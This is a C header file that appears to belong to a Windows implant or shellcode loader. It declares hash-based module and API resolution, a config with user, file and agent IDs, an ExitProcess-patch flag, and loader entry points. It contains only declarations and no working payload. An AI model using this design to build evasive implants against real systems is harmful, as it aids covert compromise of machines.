#pragma once
#include <windows.h>
#include "../api/apis.h"
#include "nt.h"
#include "utils.h"


#ifdef DEBUG
#define DBGA(msg) do { \
    DWORD _w; \
    WriteFile( \
    GetStdHandle(STD_OUTPUT_HANDLE), \
    msg, LdrStrlen(msg), &_w, NULL); \
} while(0)
#else
#define DBGA(msg)
#endif

typedef struct _Config {
	CHAR UserId[37];
#ifdef LOAD_AND_EXIT 
	CHAR FileId[37];
#endif
	CHAR AgentId[37];
} Config;

typedef struct _LdrInstance {
	Win32 *win32;
	Modules *modules;
	Config *config;
	BOOL ExitProcessPatched;
	PVOID TextSection;

} LdrInstance;

extern LdrInstance *ldr;


HMODULE GetModule(DWORD Hash);
FARPROC GetProc(HANDLE dll, DWORD Hash);
DWORD HashStringA(const char *str);
DWORD HashStringW(const wchar_t *str);

void LdrMain();
BOOL LdrAllocateCoreStructsAndLoadApis();
BOOL ParseConfig();

void LdrExitThread(NTSTATUS code);